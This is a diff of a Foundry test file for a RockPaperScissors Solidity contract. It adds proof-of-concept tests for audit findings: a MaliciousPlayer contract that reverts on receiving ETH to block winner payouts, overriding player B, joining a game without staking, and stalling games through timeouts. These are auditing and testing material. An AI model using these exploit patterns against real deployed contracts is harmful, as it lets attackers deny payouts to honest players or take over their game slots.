@@ -5,22 +5,72 @@ import "forge-std/Test.sol";
 import "../src/RockPaperScissors.sol";
 import "../src/WinningToken.sol";
 
-contract Reenter {
-    RockPaperScissors public game;
-    uint256 public gameId;
-
-    constructor(address payable _game, uint256 _betAmount, uint256 _timeout, uint256 _totalTurns) payable {
-        game = RockPaperScissors(_game);
-        gameId = game.createGameWithEth{value: _betAmount}(_totalTurns, _timeout);
+// https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9lyebbx0003in046t2i9zo8
+// The contract `RockPaperScissors.sol` attempts to transfer ETH to the winner of a game using a low-level call. If the _winner is a contract that reverts on receiving ETH (e.g., using a receive() function that reverts), the transaction fails and the logic reverts entirely
+/// @notice Attacking contract reverts upon receiving ETH
+contract MaliciousPlayer {
+    receive() external payable {
+        revert("I refuse your ETH");
     }
 
-    fallback() external payable {
-        bytes memory data = abi.encodeWithSignature("cancelGame(uint256)", gameId);
-        if (msg.sender.balance > msg.value) {
-            (msg.sender).call(data);
-        }
+    function getCommit() external pure returns (uint8 move, bytes32 salt, bytes32 commitment) {
+        move = 1; // Rock
+        salt = keccak256("malicious");
+        commitment = keccak256(abi.encodePacked(move, salt));
     }
 }
+
+// forge test --mt test_DoSOnWinnerPayout -vvvv
+// https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9lyebbx0003in046t2i9zo8
+// The contract `RockPaperScissors.sol` attempts to transfer ETH to the winner of a game using a low-level call. If the _winner is a contract that reverts on receiving ETH (e.g., using a receive() function that reverts), the transaction fails and the logic reverts entirely
+contract RockPaperScissorsDoSTest is Test {
+    RockPaperScissors public game;
+    WinningToken public token;
+    MaliciousPlayer public attacker;
+    address public honest = address(0xA1);
+
+    function setUp() public {
+        game = new RockPaperScissors();
+        token = game.winningToken();
+        attacker = new MaliciousPlayer();
+
+        // Allocate funds to both players
+        vm.deal(honest, 1 ether);
+        vm.deal(address(attacker), 1 ether);
+    }
+
+    function test_DoSOnWinnerPayout() public {
+        // Step 1: Honest player creates a game
+        vm.prank(honest);
+        uint256 gameId = game.createGameWithEth{value: 0.5 ether}(1, 10 minutes);
+
+        // Step 2: The attacker generates his commit
+        (,, bytes32 attackerCommit) = attacker.getCommit();
+
+        // Step 3: The attacker joins the game
+        vm.prank(address(attacker));
+        game.joinGameWithEth{value: 0.5 ether}(gameId);
+
+        // Step 4: Both commit
+        vm.prank(honest);
+        bytes32 saltHonest = keccak256("scissors");
+        bytes32 commitHonest = keccak256(abi.encodePacked(uint8(3), saltHonest)); // Scissors
+        game.commitMove(gameId, commitHonest);
+
+        vm.prank(address(attacker));
+        game.commitMove(gameId, attackerCommit);
+
+        // Step 5: Both reveal
+        vm.prank(honest);
+        game.revealMove(gameId, 3, saltHonest); // Scissors
+
+        // Attacker reveals and wins → an attempt is made to pay him → his contract is reverted → Transfer failed
+        vm.expectRevert("Transfer failed");
+        vm.prank(address(attacker));
+        game.revealMove(gameId, 1, keccak256("malicious")); // Rock
+    }
+}
+
 
 contract RockPaperScissorsTest is Test {
     // Events for testing
@@ -96,59 +146,181 @@ contract RockPaperScissorsTest is Test {
         token.mint(playerC, 10);
     }
 
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9m03owg000dkv04sme11vtm
+    function test_StuckInCommitPhase() public {
+        address playerA = address(0xA1);
+        address playerB = address(0xB2);
     
-    // Test cancelGame against reentrancy
-    function testReentrancyCancel() public {
-        vm.deal(address(game), 10 ether); 
-        Reenter reenter = (new Reenter){value: BET_AMOUNT}(payable(game), BET_AMOUNT, TIMEOUT, TOTAL_TURNS);
-
-        assertEq(address(reenter).balance, 0);
-
-        // Join the game
-        console.log(address(playerB).balance);
-        vm.startPrank(playerB);        
-        game.joinGameWithEth{value: BET_AMOUNT}(gameId);
-        vm.stopPrank();
-        console.log(address(playerB).balance);
-
-        // Verify game details
-        (
-            address storedPlayerA,
-            address storedPlayerB,
-            uint256 bet,
-            uint256 timeoutInterval,
-            ,
-            ,
-            ,
-            uint256 totalTurns,
-            uint256 currentTurn,
-            ,
-            ,
-            ,
-            ,
-            ,
-            ,
-            RockPaperScissors.GameState state
-        ) = game.games(gameId);
-
-        assertEq(storedPlayerA, address(reenter));
-        assertEq(storedPlayerB, playerB);
-        assertEq(bet, BET_AMOUNT);
-        assertEq(timeoutInterval, TIMEOUT);
-        assertEq(totalTurns, TOTAL_TURNS);
-        assertEq(currentTurn, 1);
-        assertEq(uint256(state), uint256(RockPaperScissors.GameState.Created));
-
-        // Try to cancel game using reentrancy
-        vm.prank(payable(reenter));
-        game.cancelGame(gameId);
-
-        // assertGt(address(reenter).balance, 9 ether);
-        assertEq(address(reenter).balance, BET_AMOUNT);
-        // console.log(address(game).balance);
-        // console.log(address(reenter).balance);
-        console.log(address(playerB).balance);
+        RockPaperScissors game = new RockPaperScissors();
+        vm.deal(playerA, 1 ether);
+        vm.deal(playerB, 1 ether);
+    
+        vm.prank(playerA);
+        uint256 gameId = game.createGameWithEth{value: 0.5 ether}(1, 600);
+    
+        vm.prank(playerB);
+        game.joinGameWithEth{value: 0.5 ether}(gameId);
+    
+        bytes32 saltA = keccak256("123salt");
+        bytes32 commitA = keccak256(abi.encodePacked(uint8(1), saltA));
+        vm.prank(playerA);
+        game.commitMove(gameId, commitA);
+    
+        // Player B never commits
+        vm.warp(block.timestamp + 7 days);
+    
+        vm.expectRevert("Cannot timeout yet");
+        vm.prank(playerA);
+        game.timeoutReveal(gameId); // Unexpectedly succeeds // [FAIL: next call did not revert as expected]
     }
+
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9pvdedb0005la044w93hs7m
+    function testJoinGameWithTokenOverridesOriginalPlayerB() public {
+        // First create address for bob (attacker) and fund bob 
+        address bob = makeAddr("bob");
+        vm.prank(address(game));
+        token.mint(bob, 10);
+
+        vm.startPrank(playerA);
+        token.approve(address(game), 1);
+        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
+        vm.stopPrank();
+        vm.startPrank(playerB);
+        token.approve(address(game), 1);
+        game.joinGameWithToken(gameId);
+        vm.stopPrank();
+
+        // Now bob joins the game with token overriding playerB
+        vm.startPrank(bob);
+        token.approve(address(game), 1);
+        game.joinGameWithToken(gameId);
+        vm.stopPrank();
+
+        // Verify bob's attack on playerB succeeded
+        (, address storedPlayerB,,,,,,,,,,,,,, ) =
+            game.games(gameId);
+        assertEq(storedPlayerB, bob);
+    }
+
+    function testJoinGameWithEthOverridesOriginalPlayerB() public {
+        // First create address for bob and fund bob 
+        address bob = makeAddr("bob");
+        vm.deal(bob, 10 ether);
+
+        uint amount = 1 ether;
+        vm.startPrank(playerA);
+        token.approve(address(game), 1);
+        gameId = game.createGameWithEth{value: amount}(TOTAL_TURNS, TIMEOUT);
+        vm.stopPrank();
+        vm.startPrank(playerB);
+        game.joinGameWithEth{value:amount}(gameId);
+        vm.stopPrank();
+
+        // Now bob joins the game with token overriding playerB
+        vm.startPrank(bob);
+        game.joinGameWithEth{value: amount}(gameId);
+        vm.stopPrank();
+
+        // Verify bob's attack on playerB succeeded
+        (, address storedPlayerB,,,,,,,,,,,,,, ) =
+            game.games(gameId);
+        assertEq(storedPlayerB, bob);
+    }
+
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9lwnrjc0003l204pdhs0j6h
+    function testPlayerBCanJoinTokenGameForFree() public {
+        // playerA creates a game with token.
+        vm.startPrank(playerA);
+        token.approve(address(game), 1);
+        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
+        vm.stopPrank();
+
+        vm.startPrank(playerB);
+        console2.log("playerB token balance before joining: ", token.balanceOf(playerB));
+        console2.log("playerB ETH balance before joining: ", playerB.balance);
+        // This line confirms playerB joined the game.
+        vm.expectEmit();
+        emit PlayerJoined(gameId, address(playerB));
+        // playerB joins game by calling joinGameWithEth with no value.
+        game.joinGameWithEth{value: 0}(gameId);
+        // playerB's balance has not changed.
+        console2.log("playerB token balance after joining: ", token.balanceOf(playerB));
+        console2.log("playerB ETH balance before joining: ", playerB.balance);
+    }
+
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9pfwle6000hlh042hdxz8hf
+    function testGameDoesNotEndAfterMajorityWins() public {
+        uint256 _gameId;
+        uint256 playerAETHBalanceBefore;
+        uint256 playerAETHBalanceAfter;
+        uint256 playerBETHBalanceBefore;
+        uint256 playerBETHBalanceAfter;
+
+        _gameId = createAndJoinGame();
+        playerAETHBalanceBefore = playerA.balance;
+        playerBETHBalanceBefore = playerB.balance;
+
+        // Player A has already won majority of turns
+        playTurn(_gameId, RockPaperScissors.Move.Rock, RockPaperScissors.Move.Scissors);
+        playTurn(_gameId, RockPaperScissors.Move.Rock, RockPaperScissors.Move.Scissors);
+
+        // Player B refuses to play (commit) the remaining turns
+
+        // Player A has no way to cancel the game
+        vm.prank(playerA);
+        vm.expectRevert();
+        game.cancelGame(_gameId);
+
+        // Player A does not their receive rewards
+        playerAETHBalanceAfter = playerA.balance;
+        assertEq(playerAETHBalanceBefore, playerAETHBalanceAfter);
+        
+        // Game state is stuck in "Committed"
+        (,,uint256 betAmount,,,,,,,,,,,,,RockPaperScissors.GameState state) = game.games(_gameId);
+        assertEq(uint8(state), uint8(RockPaperScissors.GameState.Committed));
+
+        // Case 3 Escape Hatch
+        // Player A waits for the revealDeadline (set in 2nd turn) to elapse
+        vm.warp(block.timestamp + TIMEOUT + 1);
+        
+        // Player A calls timeoutReveal as escape hatch to recover some funds
+        vm.prank(playerA);
+        game.timeoutReveal(_gameId);
+
+        // Player A does not their receive rewards (only refunded bet)
+        playerAETHBalanceAfter = playerA.balance;
+        uint256 PROTOCOL_FEE_PERCENT = 10;
+        uint256 playerARightfulWinnings = (betAmount * 2 * (100 - PROTOCOL_FEE_PERCENT)) / 100;
+        assertLt(playerAETHBalanceAfter - playerAETHBalanceBefore, playerARightfulWinnings);
+        assertEq(playerAETHBalanceAfter - playerAETHBalanceBefore, betAmount);
+
+        // Player B got refunded their bet eventhough they lost
+        playerBETHBalanceAfter = playerB.balance;
+        assertEq(playerBETHBalanceAfter - playerBETHBalanceBefore, betAmount);
+
+    }
+
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/cm9pwe9ct0005jr04yk6poku2
+    function testTimeoutRevealAttack() public {
+        uint256 totalTurns = 3;
+        uint256 timeoutInterval = 10 minutes;
+        bytes32 _salt = bytes32(keccak256("salt"));
+        RockPaperScissors.Move move = RockPaperScissors.Move.Paper;
+
+        vm.prank(playerA);
+        uint256 gameNum = game.createGameWithEth{value: 1 ether}(totalTurns, timeoutInterval);
+
+        vm.startPrank(playerB);
+        game.joinGameWithEth{value: 1 ether}(gameNum);
+        bytes32 commit = keccak256(abi.encodePacked(move, _salt));
+        game.commitMove(gameNum, commit);
+        game.timeoutReveal(gameNum);
+        vm.stopPrank();
+        // here playerA can't commit his move
+        vm.prank(playerA);
+        game.commitMove(gameNum, commit);
+    }
+    
 
     // Inconsistent Checks On game.bet val In joinGameWithEth Function Allows Player B To Join Game Without Staking
     // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/3
